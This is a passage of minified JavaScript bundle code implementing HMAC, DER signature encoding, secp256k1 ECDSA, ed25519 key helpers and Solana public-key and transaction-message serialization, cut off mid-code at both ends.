t.finished=n,t.destroyed=i,t.blockLen=o,t.outputLen=s,t.oHash=e._cloneInto(t.oHash),t.iHash=r._cloneInto(t.iHash),t}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}}const Rr=(t,e,r)=>new Tr(t,e).update(r).digest();function Pr(t){void 0!==t.lowS&&H("lowS",t.lowS),void 0!==t.prehash&&H("prehash",t.prehash)}Rr.create=(t,e)=>new Tr(t,e);const{Ph:Cr,aT:Lr}=t,Nr={Err:class extends Error{constructor(t=""){super(t)}},_tlv:{encode:(t,e)=>{const{Err:r}=Nr;if(t<0||t>256)throw new r("tlv.encode: wrong tag");if(1&e.length)throw new r("tlv.encode: unpadded data");const n=e.length/2,i=V(n);if(i.length/2&128)throw new r("tlv.encode: long form length too big");const o=n>127?V(i.length/2|128):"";return V(t)+o+i+e},decode(t,e){const{Err:r}=Nr;let n=0;if(t<0||t>256)throw new r("tlv.encode: wrong tag");if(e.length<2||e[n++]!==t)throw new r("tlv.decode: wrong tlv");const i=e[n++];let o=0;if(128&i){const t=127&i;if(!t)throw new r("tlv.decode(long): indefinite length not supported");if(t>4)throw new r("tlv.decode(long): byte length is too big");const s=e.subarray(n,n+t);if(s.length!==t)throw new r("tlv.decode: length bytes not complete");if(0===s[0])throw new r("tlv.decode(long): zero leftmost byte");for(const t of s)o=o<<8|t;if(n+=t,o<128)throw new r("tlv.decode(long): not minimal encoding")}else o=i;const s=e.subarray(n,n+o);if(s.length!==o)throw new r("tlv.decode: wrong value length");return{v:s,l:e.subarray(n+o)}}},_int:{encode(t){const{Err:e}=Nr;if(t<Ur)throw new e("integer: negative integers are not allowed");let r=V(t);if(8&Number.parseInt(r[0],16)&&(r="00"+r),1&r.length)throw new e("unexpected DER parsing assertion: unpadded hex");return r},decode(t){const{Err:e}=Nr;if(128&t[0])throw new e("invalid signature integer: negative");if(0===t[0]&&!(128&t[1]))throw new e("invalid signature integer: unnecessary leading zero");return Cr(t)}},toSig(t){const{Err:e,_int:r,_tlv:n}=Nr,i="string"==typeof t?Lr(t):t;F(i);const{v:o,l:s}=n.decode(48,i);if(s.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l:c}=n.decode(2,o),{v:u,l:h}=n.decode(2,c);if(h.length)throw new e("invalid signature: left bytes after parsing");return{r:r.decode(a),s:r.decode(u)}},hexFromSig(t){const{_tlv:e,_int:r}=Nr,n=e.encode(2,r.encode(t.r))+e.encode(2,r.encode(t.s));return e.encode(48,n)}},Ur=BigInt(0),zr=BigInt(1),Dr=(BigInt(2),BigInt(3));function jr(t){const e=function(t){const e=Wt(t);return dt(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}(t),{Fp:r,n}=e,i=r.BYTES+1,o=2*r.BYTES+1;function s(t){return St(t,n)}function a(t){return _t(t,n)}const{ProjectivePoint:c,normPrivateKeyToScalar:u,weierstrassEquation:h,isWithinCurveOrder:l}=function(t){const e=function(t){const e=Wt(t);dt(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:r,Fp:n,a:i}=e;if(r){if(!n.eql(i,n.ZERO))throw new Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");if("object"!=typeof r||"bigint"!=typeof r.beta||"function"!=typeof r.splitScalar)throw new Error("invalid endomorphism, expected beta: bigint and splitScalar: function")}return Object.freeze({...e})}(t),{Fp:r}=e,n=xt(e.n,e.nBitLength),i=e.toBytes||((t,e,n)=>{const i=e.toAffine();return nt(Uint8Array.from([4]),r.toBytes(i.x),r.toBytes(i.y))}),o=e.fromBytes||(t=>{const e=t.subarray(1);return{x:r.fromBytes(e.subarray(0,r.BYTES)),y:r.fromBytes(e.subarray(r.BYTES,2*r.BYTES))}});function s(t){const{a:n,b:i}=e,o=r.sqr(t),s=r.mul(o,t);return r.add(r.add(s,r.mul(t,n)),i)}if(!r.eql(r.sqr(e.Gy),s(e.Gx)))throw new Error("bad generator point: equation left != right");function a(t){const{allowedPrivateKeyLengths:r,nByteLength:n,wrapPrivateKey:i,n:o}=e;if(r&&"bigint"!=typeof t){if(q(t)&&(t=$(t)),"string"!=typeof t||!r.includes(t.length))throw new Error("invalid private key");t=t.padStart(2*n,"0")}let s;try{s="bigint"==typeof t?t:X(rt("private key",t,n))}catch(e){throw new Error("invalid private key, expected hex or "+n+" bytes, got "+typeof t)}return i&&(s=St(s,o)),st("private key",s,zr,o),s}function c(t){if(!(t instanceof l))throw new Error("ProjectivePoint expected")}const u=pt(((t,e)=>{const{px:n,py:i,pz:o}=t;if(r.eql(o,r.ONE))return{x:n,y:i};const s=t.is0();null==e&&(e=s?r.ONE:r.inv(o));const a=r.mul(n,e),c=r.mul(i,e),u=r.mul(o,e);if(s)return{x:r.ZERO,y:r.ZERO};if(!r.eql(u,r.ONE))throw new Error("invZ was invalid");return{x:a,y:c}})),h=pt((t=>{if(t.is0()){if(e.allowInfinityPoint&&!r.is0(t.py))return;throw new Error("bad point: ZERO")}const{x:n,y:i}=t.toAffine();if(!r.isValid(n)||!r.isValid(i))throw new Error("bad point: x or y not FE");const o=r.sqr(i),a=s(n);if(!r.eql(o,a))throw new Error("bad point: equation left != right");if(!t.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0}));class l{constructor(t,e,n){if(this.px=t,this.py=e,this.pz=n,null==t||!r.isValid(t))throw new Error("x required");if(null==e||!r.isValid(e))throw new Error("y required");if(null==n||!r.isValid(n))throw new Error("z required");Object.freeze(this)}static fromAffine(t){const{x:e,y:n}=t||{};if(!t||!r.isValid(e)||!r.isValid(n))throw new Error("invalid affine point");if(t instanceof l)throw new Error("projective point not allowed");const i=t=>r.eql(t,r.ZERO);return i(e)&&i(n)?l.ZERO:new l(e,n,r.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(t){const e=r.invertBatch(t.map((t=>t.pz)));return t.map(((t,r)=>t.toAffine(e[r]))).map(l.fromAffine)}static fromHex(t){const e=l.fromAffine(o(rt("pointHex",t)));return e.assertValidity(),e}static fromPrivateKey(t){return l.BASE.multiply(a(t))}static msm(t,e){return jt(l,n,t,e)}_setWindowSize(t){d.setWindowSize(this,t)}assertValidity(){h(this)}hasEvenY(){const{y:t}=this.toAffine();if(r.isOdd)return!r.isOdd(t);throw new Error("Field doesn't support isOdd")}equals(t){c(t);const{px:e,py:n,pz:i}=this,{px:o,py:s,pz:a}=t,u=r.eql(r.mul(e,a),r.mul(o,i)),h=r.eql(r.mul(n,a),r.mul(s,i));return u&&h}negate(){return new l(this.px,r.neg(this.py),this.pz)}double(){const{a:t,b:n}=e,i=r.mul(n,Dr),{px:o,py:s,pz:a}=this;let c=r.ZERO,u=r.ZERO,h=r.ZERO,f=r.mul(o,o),d=r.mul(s,s),p=r.mul(a,a),g=r.mul(o,s);return g=r.add(g,g),h=r.mul(o,a),h=r.add(h,h),c=r.mul(t,h),u=r.mul(i,p),u=r.add(c,u),c=r.sub(d,u),u=r.add(d,u),u=r.mul(c,u),c=r.mul(g,c),h=r.mul(i,h),p=r.mul(t,p),g=r.sub(f,p),g=r.mul(t,g),g=r.add(g,h),h=r.add(f,f),f=r.add(h,f),f=r.add(f,p),f=r.mul(f,g),u=r.add(u,f),p=r.mul(s,a),p=r.add(p,p),f=r.mul(p,g),c=r.sub(c,f),h=r.mul(p,d),h=r.add(h,h),h=r.add(h,h),new l(c,u,h)}add(t){c(t);const{px:n,py:i,pz:o}=this,{px:s,py:a,pz:u}=t;let h=r.ZERO,f=r.ZERO,d=r.ZERO;const p=e.a,g=r.mul(e.b,Dr);let m=r.mul(n,s),y=r.mul(i,a),w=r.mul(o,u),b=r.add(n,i),v=r.add(s,a);b=r.mul(b,v),v=r.add(m,y),b=r.sub(b,v),v=r.add(n,o);let k=r.add(s,u);return v=r.mul(v,k),k=r.add(m,w),v=r.sub(v,k),k=r.add(i,o),h=r.add(a,u),k=r.mul(k,h),h=r.add(y,w),k=r.sub(k,h),d=r.mul(p,v),h=r.mul(g,w),d=r.add(h,d),h=r.sub(y,d),d=r.add(y,d),f=r.mul(h,d),y=r.add(m,m),y=r.add(y,m),w=r.mul(p,w),v=r.mul(g,v),y=r.add(y,w),w=r.sub(m,w),w=r.mul(p,w),v=r.add(v,w),m=r.mul(y,v),f=r.add(f,m),m=r.mul(k,v),h=r.mul(b,h),h=r.sub(h,m),m=r.mul(b,y),d=r.mul(k,d),d=r.add(d,m),new l(h,f,d)}subtract(t){return this.add(t.negate())}is0(){return this.equals(l.ZERO)}wNAF(t){return d.wNAFCached(this,t,l.normalizeZ)}multiplyUnsafe(t){const{endo:n,n:i}=e;st("scalar",t,Ur,i);const o=l.ZERO;if(t===Ur)return o;if(this.is0()||t===zr)return this;if(!n||d.hasPrecomputes(this))return d.wNAFCachedUnsafe(this,t,l.normalizeZ);let{k1neg:s,k1:a,k2neg:c,k2:u}=n.splitScalar(t),h=o,f=o,p=this;for(;a>Ur||u>Ur;)a&zr&&(h=h.add(p)),u&zr&&(f=f.add(p)),p=p.double(),a>>=zr,u>>=zr;return s&&(h=h.negate()),c&&(f=f.negate()),f=new l(r.mul(f.px,n.beta),f.py,f.pz),h.add(f)}multiply(t){const{endo:n,n:i}=e;let o,s;if(st("scalar",t,zr,i),n){const{k1neg:e,k1:i,k2neg:a,k2:c}=n.splitScalar(t);let{p:u,f:h}=this.wNAF(i),{p:f,f:p}=this.wNAF(c);u=d.constTimeNegate(e,u),f=d.constTimeNegate(a,f),f=new l(r.mul(f.px,n.beta),f.py,f.pz),o=u.add(f),s=h.add(p)}else{const{p:e,f:r}=this.wNAF(t);o=e,s=r}return l.normalizeZ([o,s])[0]}multiplyAndAddUnsafe(t,e,r){const n=l.BASE,i=(t,e)=>e!==Ur&&e!==zr&&t.equals(n)?t.multiply(e):t.multiplyUnsafe(e),o=i(this,e).add(i(t,r));return o.is0()?void 0:o}toAffine(t){return u(this,t)}isTorsionFree(){const{h:t,isTorsionFree:r}=e;if(t===zr)return!0;if(r)return r(l,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:t,clearCofactor:r}=e;return t===zr?this:r?r(l,this):this.multiplyUnsafe(e.h)}toRawBytes(t=!0){return H("isCompressed",t),this.assertValidity(),i(l,this,t)}toHex(t=!0){return H("isCompressed",t),$(this.toRawBytes(t))}}l.BASE=new l(e.Gx,e.Gy,r.ONE),l.ZERO=new l(r.ZERO,r.ONE,r.ZERO);const f=e.nBitLength,d=Dt(l,e.endo?Math.ceil(f/2):f);return{CURVE:e,ProjectivePoint:l,normPrivateKeyToScalar:a,weierstrassEquation:s,isWithinCurveOrder:function(t){return ot(t,zr,e.n)}}}({...e,toBytes(t,e,n){const i=e.toAffine(),o=r.toBytes(i.x),s=nt;return H("isCompressed",n),n?s(Uint8Array.from([e.hasEvenY()?2:3]),o):s(Uint8Array.from([4]),o,r.toBytes(i.y))},fromBytes(t){const e=t.length,n=t[0],s=t.subarray(1);if(e!==i||2!==n&&3!==n){if(e===o&&4===n)return{x:r.fromBytes(s.subarray(0,r.BYTES)),y:r.fromBytes(s.subarray(r.BYTES,2*r.BYTES))};throw new Error("invalid Point, expected length of "+i+", or uncompressed "+o+", got "+e)}{const t=X(s);if(!ot(t,zr,r.ORDER))throw new Error("Point is not on curve");const e=h(t);let i;try{i=r.sqrt(e)}catch(t){const e=t instanceof Error?": "+t.message:"";throw new Error("Point is not on curve"+e)}return!(1&~n)!=((i&zr)===zr)&&(i=r.neg(i)),{x:t,y:i}}}}),f=t=>$(tt(t,e.nByteLength));function d(t){return t>n>>zr}const p=(t,e,r)=>X(t.slice(e,r));class g{constructor(t,e,r){this.r=t,this.s=e,this.recovery=r,this.assertValidity()}static fromCompact(t){const r=e.nByteLength;return t=rt("compactSignature",t,2*r),new g(p(t,0,r),p(t,r,2*r))}static fromDER(t){const{r:e,s:r}=Nr.toSig(rt("DER",t));return new g(e,r)}assertValidity(){st("r",this.r,zr,n),st("s",this.s,zr,n)}addRecoveryBit(t){return new g(this.r,this.s,t)}recoverPublicKey(t){const{r:n,s:i,recovery:o}=this,u=b(rt("msgHash",t));if(null==o||![0,1,2,3].includes(o))throw new Error("recovery id invalid");const h=2===o||3===o?n+e.n:n;if(h>=r.ORDER)throw new Error("recovery id 2 or 3 invalid");const l=1&o?"03":"02",d=c.fromHex(l+f(h)),p=a(h),g=s(-u*p),m=s(i*p),y=c.BASE.multiplyAndAddUnsafe(d,g,m);if(!y)throw new Error("point at infinify");return y.assertValidity(),y}hasHighS(){return d(this.s)}normalizeS(){return this.hasHighS()?new g(this.r,s(-this.s),this.recovery):this}toDERRawBytes(){return Y(this.toDERHex())}toDERHex(){return Nr.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return Y(this.toCompactHex())}toCompactHex(){return f(this.r)+f(this.s)}}const m={isValidPrivateKey(t){try{return u(t),!0}catch(t){return!1}},normPrivateKeyToScalar:u,randomPrivateKey:()=>{const t=Ot(e.n);return function(t,e,r=!1){const n=t.length,i=Mt(e),o=Ot(e);if(n<16||n<o||n>1024)throw new Error("expected "+o+"-1024 bytes of input, got "+n);const s=St(r?X(t):Q(t),e-mt)+mt;return r?et(s,i):tt(s,i)}(e.randomBytes(t),e.n)},precompute:(t=8,e=c.BASE)=>(e._setWindowSize(t),e.multiply(BigInt(3)),e)};function y(t){const e=q(t),r="string"==typeof t,n=(e||r)&&t.length;return e?n===i||n===o:r?n===2*i||n===2*o:t instanceof c}const w=e.bits2int||function(t){if(t.length>8192)throw new Error("input is too large");const r=X(t),n=8*t.length-e.nBitLength;return n>0?r>>BigInt(n):r},b=e.bits2int_modN||function(t){return s(w(t))},v=ct(e.nBitLength);function k(t){return st("num < 2^"+e.nBitLength,t,Ur,v),tt(t,e.nByteLength)}const S={lowS:e.lowS,prehash:!1},A={lowS:e.lowS,prehash:!1};return c.BASE._setWindowSize(8),{CURVE:e,getPublicKey:function(t,e=!0){return c.fromPrivateKey(t).toRawBytes(e)},getSharedSecret:function(t,e,r=!0){if(y(t))throw new Error("first arg must be private key");if(!y(e))throw new Error("second arg must be public key");return c.fromHex(e).multiply(u(t)).toRawBytes(r)},sign:function(t,n,i=S){const{seed:o,k2sig:h}=function(t,n,i=S){if(["recovered","canonical"].some((t=>t in i)))throw new Error("sign() legacy options not supported");const{hash:o,randomBytes:h}=e;let{lowS:f,prehash:p,extraEntropy:m}=i;null==f&&(f=!0),t=rt("msgHash",t),Pr(i),p&&(t=rt("prehashed msgHash",o(t)));const y=b(t),v=u(n),A=[k(v),k(y)];if(null!=m&&!1!==m){const t=!0===m?h(r.BYTES):m;A.push(rt("extraEntropy",t))}const E=nt(...A),_=y;return{seed:E,k2sig:function(t){const e=w(t);if(!l(e))return;const r=a(e),n=c.BASE.multiply(e).toAffine(),i=s(n.x);if(i===Ur)return;const o=s(r*s(_+i*v));if(o===Ur)return;let u=(n.x===i?0:2)|Number(n.y&zr),h=o;return f&&d(o)&&(h=function(t){return d(t)?s(-t):t}(o),u^=1),new g(i,h,u)}}}(t,n,i),f=e;return lt(f.hash.outputLen,f.nByteLength,f.hmac)(o,h)},verify:function(t,r,n,i=A){const o=t;r=rt("msgHash",r),n=rt("publicKey",n);const{lowS:u,prehash:h,format:l}=i;if(Pr(i),"strict"in i)throw new Error("options.strict was renamed to lowS");if(void 0!==l&&"compact"!==l&&"der"!==l)throw new Error("format must be compact or der");const f="string"==typeof o||q(o),d=!f&&!l&&"object"==typeof o&&null!==o&&"bigint"==typeof o.r&&"bigint"==typeof o.s;if(!f&&!d)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let p,m;try{if(d&&(p=new g(o.r,o.s)),f){try{"compact"!==l&&(p=g.fromDER(o))}catch(t){if(!(t instanceof Nr.Err))throw t}p||"der"===l||(p=g.fromCompact(o))}m=c.fromHex(n)}catch(t){return!1}if(!p)return!1;if(u&&p.hasHighS())return!1;h&&(r=e.hash(r));const{r:y,s:w}=p,v=b(r),k=a(w),S=s(v*k),E=s(y*k),_=c.BASE.multiplyAndAddUnsafe(m,S,E)?.toAffine();return!!_&&s(_.x)===y},ProjectivePoint:c,Signature:g,utils:m}}function Wr(t){return{hash:t,hmac:(e,...r)=>Rr(t,e,function(...t){let e=0;for(let r=0;r<t.length;r++){const n=t[r];o(n),e+=n.length}const r=new Uint8Array(e);for(let e=0,n=0;e<t.length;e++){const i=t[e];r.set(i,n),n+=i.length}return r}(...r)),randomBytes:d}}BigInt(4);const qr=BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),Fr=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),Hr=BigInt(1),Kr=BigInt(2),$r=(t,e)=>(t+e/Kr)/e;const Vr=xt(qr,void 0,void 0,{sqrt:function(t){const e=qr,r=BigInt(3),n=BigInt(6),i=BigInt(11),o=BigInt(22),s=BigInt(23),a=BigInt(44),c=BigInt(88),u=t*t*t%e,h=u*u*t%e,l=Et(h,r,e)*h%e,f=Et(l,r,e)*h%e,d=Et(f,Kr,e)*u%e,p=Et(d,i,e)*d%e,g=Et(p,o,e)*p%e,m=Et(g,a,e)*g%e,y=Et(m,c,e)*m%e,w=Et(y,a,e)*g%e,b=Et(w,r,e)*h%e,v=Et(b,s,e)*p%e,k=Et(v,n,e)*u%e,S=Et(k,Kr,e);if(!Vr.eql(Vr.sqr(S),t))throw new Error("Cannot find square root");return S}}),Gr=function(t,e){const r=e=>jr({...t,...Wr(e)});return Object.freeze({...r(e),create:r})}({a:BigInt(0),b:BigInt(7),Fp:Vr,n:Fr,Gx:BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),Gy:BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),h:BigInt(1),lowS:!0,endo:{beta:BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),splitScalar:t=>{const e=Fr,r=BigInt("0x3086d221a7d46bcde86c90e49284eb15"),n=-Hr*BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),i=BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),o=r,s=BigInt("0x100000000000000000000000000000000"),a=$r(o*t,e),c=$r(-n*t,e);let u=St(t-a*r-c*i,e),h=St(-a*n-c*o,e);const l=u>s,f=h>s;if(l&&(u=e-u),f&&(h=e-h),u>s||h>s)throw new Error("splitScalar: Endomorphism failed, k="+t);return{k1neg:l,k1:u,k2neg:f,k2:h}}}},Or);BigInt(0),Gr.ProjectivePoint,ne.utils.randomPrivateKey;const Jr=()=>{const t=ne.utils.randomPrivateKey(),e=Zr(t),r=new Uint8Array(64);return r.set(t),r.set(e,32),{publicKey:e,secretKey:r}},Zr=ne.getPublicKey;function Yr(t){try{return ne.ExtendedPoint.fromHex(t),!0}catch{return!1}}const Xr=(t,e)=>ne.sign(t,e.slice(0,32)),Qr=ne.verify,tn=t=>n.Buffer.isBuffer(t)?t:t instanceof Uint8Array?n.Buffer.from(t.buffer,t.byteOffset,t.byteLength):n.Buffer.from(t);class en{constructor(t){Object.assign(this,t)}encode(){return n.Buffer.from((0,Be.serialize)(rn,this))}static decode(t){return(0,Be.deserialize)(rn,this,t)}static decodeUnchecked(t){return(0,Be.deserializeUnchecked)(rn,this,t)}}const rn=new Map;var nn;const on=32;let sn=1;class an extends en{constructor(t){if(super({}),this._bn=void 0,function(t){return void 0!==t._bn}(t))this._bn=t._bn;else{if("string"==typeof t){const e=ae().decode(t);if(e.length!=on)throw new Error("Invalid public key input");this._bn=new(oe())(e)}else this._bn=new(oe())(t);if(this._bn.byteLength()>on)throw new Error("Invalid public key input")}}static unique(){const t=new an(sn);return sn+=1,new an(t.toBuffer())}equals(t){return this._bn.eq(t._bn)}toBase58(){return ae().encode(this.toBytes())}toJSON(){return this.toBase58()}toBytes(){const t=this.toBuffer();return new Uint8Array(t.buffer,t.byteOffset,t.byteLength)}toBuffer(){const t=this._bn.toArrayLike(n.Buffer);if(t.length===on)return t;const e=n.Buffer.alloc(32);return t.copy(e,32-t.length),e}get[Symbol.toStringTag](){return`PublicKey(${this.toString()})`}toString(){return this.toBase58()}static async createWithSeed(t,e,r){const i=n.Buffer.concat([t.toBuffer(),n.Buffer.from(e),r.toBuffer()]),o=_e(i);return new an(o)}static createProgramAddressSync(t,e){let r=n.Buffer.alloc(0);t.forEach((function(t){if(t.length>32)throw new TypeError("Max seed length exceeded");r=n.Buffer.concat([r,tn(t)])})),r=n.Buffer.concat([r,e.toBuffer(),n.Buffer.from("ProgramDerivedAddress")]);const i=_e(r);if(Yr(i))throw new Error("Invalid seeds, address must fall off the curve");return new an(i)}static async createProgramAddress(t,e){return this.createProgramAddressSync(t,e)}static findProgramAddressSync(t,e){let r,i=255;for(;0!=i;){try{const o=t.concat(n.Buffer.from([i]));r=this.createProgramAddressSync(o,e)}catch(t){if(t instanceof TypeError)throw t;i--;continue}return[r,i]}throw new Error("Unable to find a viable program address nonce")}static async findProgramAddress(t,e){return this.findProgramAddressSync(t,e)}static isOnCurve(t){return Yr(new an(t).toBytes())}}nn=an,an.default=new nn("11111111111111111111111111111111"),rn.set(an,{kind:"struct",fields:[["_bn","u256"]]}),new an("BPFLoader1111111111111111111111111111111111");const cn=1232;class un extends Error{constructor(t){super(`Signature ${t} has expired: block height exceeded.`),this.signature=void 0,this.signature=t}}Object.defineProperty(un.prototype,"name",{value:"TransactionExpiredBlockheightExceededError"});class hn extends Error{constructor(t,e){super(`Transaction was not confirmed in ${e.toFixed(2)} seconds. It is unknown if it succeeded or failed. Check signature ${t} using the Solana Explorer or CLI tools.`),this.signature=void 0,this.signature=t}}Object.defineProperty(hn.prototype,"name",{value:"TransactionExpiredTimeoutError"});class ln extends Error{constructor(t){super(`Signature ${t} has expired: the nonce is no longer valid.`),this.signature=void 0,this.signature=t}}Object.defineProperty(ln.prototype,"name",{value:"TransactionExpiredNonceInvalidError"});class fn{constructor(t,e){this.staticAccountKeys=void 0,this.accountKeysFromLookups=void 0,this.staticAccountKeys=t,this.accountKeysFromLookups=e}keySegments(){const t=[this.staticAccountKeys];return this.accountKeysFromLookups&&(t.push(this.accountKeysFromLookups.writable),t.push(this.accountKeysFromLookups.readonly)),t}get(t){for(const e of this.keySegments()){if(t<e.length)return e[t];t-=e.length}}get length(){return this.keySegments().flat().length}compileInstructions(t){if(this.length>256)throw new Error("Account index overflow encountered during compilation");const e=new Map;this.keySegments().flat().forEach(((t,r)=>{e.set(t.toBase58(),r)}));const r=t=>{const r=e.get(t.toBase58());if(void 0===r)throw new Error("Encountered an unknown instruction account key during compilation");return r};return t.map((t=>({programIdIndex:r(t.programId),accountKeyIndexes:t.keys.map((t=>r(t.pubkey))),data:t.data})))}}const dn=(t="publicKey")=>Ie.av(32,t),pn=(t="string")=>{const e=Ie.w3([Ie.DH("length"),Ie.DH("lengthPadding"),Ie.av(Ie.cY(Ie.DH(),-8),"chars")],t),r=e.decode.bind(e),i=e.encode.bind(e),o=e;return o.decode=(t,e)=>r(t,e).chars.toString(),o.encode=(t,e,r)=>{const o={chars:n.Buffer.from(t,"utf8")};return i(o,e,r)},o.alloc=t=>Ie.DH().span+Ie.DH().span+n.Buffer.from(t,"utf8").length,o};function gn(t,e){const r=t=>{if(t.span>=0)return t.span;if("function"==typeof t.alloc)return t.alloc(e[t.property]);if("count"in t&&"elementLayout"in t){const n=e[t.property];if(Array.isArray(n))return n.length*r(t.elementLayout)}else if("fields"in t)return gn({layout:t},e[t.property]);return 0};let n=0;return t.layout.fields.forEach((t=>{n+=r(t)})),n}function mn(t){let e=0,r=0;for(;;){let n=t.shift();if(e|=(127&n)<<7*r,r+=1,!(128&n))break}return e}function yn(t,e){let r=e;for(;;){let e=127&r;if(r>>=7,0==r){t.push(e);break}e|=128,t.push(e)}}function wn(t,e){if(!t)throw new Error(e||"Assertion failed")}class bn{constructor(t,e){this.payer=void 0,this.keyMetaMap=void 0,this.payer=t,this.keyMetaMap=e}static compile(t,e){const r=new Map,n=t=>{const e=t.toBase58();let n=r.get(e);return void 0===n&&(n={isSigner:!1,isWritable:!1,isInvoked:!1},r.set(e,n)),n},i=n(e);i.isSigner=!0,i.isWritable=!0;for(const e of t){n(e.programId).isInvoked=!0;for(const t of e.keys){const e=n(t.pubkey);e.isSigner||=t.isSigner,e.isWritable||=t.isWritable}}return new bn(e,r)}getMessageComponents(){const t=[...this.keyMetaMap.entries()];wn(t.length<=256,"Max static account keys length exceeded");const e=t.filter((([,t])=>t.isSigner&&t.isWritable)),r=t.filter((([,t])=>t.isSigner&&!t.isWritable)),n=t.filter((([,t])=>!t.isSigner&&t.isWritable)),i=t.filter((([,t])=>!t.isSigner&&!t.isWritable)),o={numRequiredSignatures:e.length+r.length,numReadonlySignedAccounts:r.length,numReadonlyUnsignedAccounts:i.length};{wn(e.length>0,"Expected at least one writable signer key");const[t]=e[0];wn(t===this.payer.toBase58(),"Expected first writable signer key to be the fee payer")}return[o,[...e.map((([t])=>new an(t))),...r.map((([t])=>new an(t))),...n.map((([t])=>new an(t))),...i.map((([t])=>new an(t)))]]}extractTableLookup(t){const[e,r]=this.drainKeysFoundInLookupTable(t.state.addresses,(t=>!t.isSigner&&!t.isInvoked&&t.isWritable)),[n,i]=this.drainKeysFoundInLookupTable(t.state.addresses,(t=>!t.isSigner&&!t.isInvoked&&!t.isWritable));if(0!==e.length||0!==n.length)return[{accountKey:t.key,writableIndexes:e,readonlyIndexes:n},{writable:r,readonly:i}]}drainKeysFoundInLookupTable(t,e){const r=new Array,n=new Array;for(const[i,o]of this.keyMetaMap.entries())if(e(o)){const e=new an(i),o=t.findIndex((t=>t.equals(e)));o>=0&&(wn(o<256,"Max lookup table index exceeded"),r.push(o),n.push(e),this.keyMetaMap.delete(i))}return[r,n]}}const vn="Reached end of buffer unexpectedly";function kn(t){if(0===t.length)throw new Error(vn);return t.shift()}function Sn(t,...e){const[r]=e;if(2===e.length?r+(e[1]??0)>t.length:r>=t.length)throw new Error(vn);return t.splice(...e)}class An{constructor(t){this.header=void 0,this.accountKeys=void 0,this.recentBlockhash=void 0,this.instructions=void 0,this.indexToProgramIds=new Map,this.header=t.header,this.accountKeys=t.accountKeys.map((t=>new an(t))),this.recentBlockhash=t.recentBlockhash,this.instructions=t.instructions,this.instructions.forEach((t=>this.indexToProgramIds.set(t.programIdIndex,this.accountKeys[t.programIdIndex])))}get version(){return"legacy"}get staticAccountKeys(){return this.accountKeys}get compiledInstructions(){return this.instructions.map((t=>({programIdIndex:t.programIdIndex,accountKeyIndexes:t.accounts,data:ae().decode(t.data)})))}get addressTableLookups(){return[]}getAccountKeys(){return new fn(this.staticAccountKeys)}static compile(t){const e=bn.compile(t.instructions,t.payerKey),[r,n]=e.getMessageComponents(),i=new fn(n).compileInstructions(t.instructions).map((t=>({programIdIndex:t.programIdIndex,accounts:t.accountKeyIndexes,data:ae().encode(t.data)})));return new An({header:r,accountKeys:n,recentBlockhash:t.recentBlockhash,instructions:i})}isAccountSigner(t){return t<this.header.numRequiredSignatures}isAccountWritable(t){const e=this.header.numRequiredSignatures;return t>=this.header.numRequiredSignatures?t-e<this.accountKeys.length-e-this.header.numReadonlyUnsignedAccounts:t<e-this.header.numReadonlySignedAccounts}isProgramId(t){return this.indexToProgramIds.has(t)}programIds(){return[...this.indexToProgramIds.values()]}nonProgramIds(){return this.accountKeys.filter(((t,e)=>!this.isProgramId(e)))}serialize(){const t=this.accountKeys.length;let e=[];yn(e,t);const r=this.instructions.map((t=>{const{accounts:e,programIdIndex:r}=t,i=Array.from(ae().decode(t.data));let o=[];yn(o,e.length);let s=[];return yn(s,i.length),{programIdIndex:r,keyIndicesCount:n.Buffer.from(o),keyIndices:e,dataLength:n.Buffer.from(s),data:i}}));let i=[];yn(i,r.length);let o=n.Buffer.alloc(cn);n.Buffer.from(i).copy(o);let s=i.length;r.forEach((t=>{const e=Ie.w3([Ie.u8("programIdIndex"),Ie.av(t.keyIndicesCount.length,"keyIndicesCount"),Ie.O6(Ie.u8("keyIndex"),t.keyIndices.length,"keyIndices"),Ie.av(t.dataLength.length,"dataLength"),Ie.O6(Ie.u8("userdatum"),t.data.length,"data")]).encode(t,o,s);s+=e})),o=o.slice(0,s);const a=Ie.w3([Ie.av(1,"numRequiredSignatures"),Ie.av(1,"numReadonlySignedAccounts"),Ie.av(1,"numReadonlyUnsignedAccounts"),Ie.av(e.length,"keyCount"),Ie.O6(dn("key"),t,"keys"),dn("recentBlockhash")]),c={numRequiredSignatures:n.Buffer.from([this.header.numRequiredSignatures]),numReadonlySignedAccounts:n.Buffer.from([this.header.numReadonlySignedAccounts]),numReadonlyUnsignedAccounts:n.Buffer.from([this.header.numReadonlyUnsignedAccounts]),keyCount:n.Buffer.from(e),keys:this.accountKeys.map((t=>tn(t.toBytes()))),recentBlockhash:ae().decode(this.recentBlockhash)};let u=n.Buffer.alloc(2048);const h=a.encode(c,u);return o.copy(u,h),u.slice(0,h+o.length)}static from(t){let e=[...t];const r=kn(e);if(r!==(127&r))throw new Error("Versioned messages must be deserialized with VersionedMessage.deserialize()");const i=kn(e),o=kn(e),s=mn(e);let a=[];for(let t=0;t<s;t++){const t=Sn(e,0,on);a.push(new an(n.Buffer.from(t)))}const c=Sn(e,0,on),u=mn(e);let h=[];for(let t=0;t<u;t++){const t=kn(e),r=Sn(e,0,mn(e)),i=Sn(e,0,mn(e)),o=ae().encode(n.Buffer.from(i));h.push({programIdIndex:t,accounts:r,data:o})}const 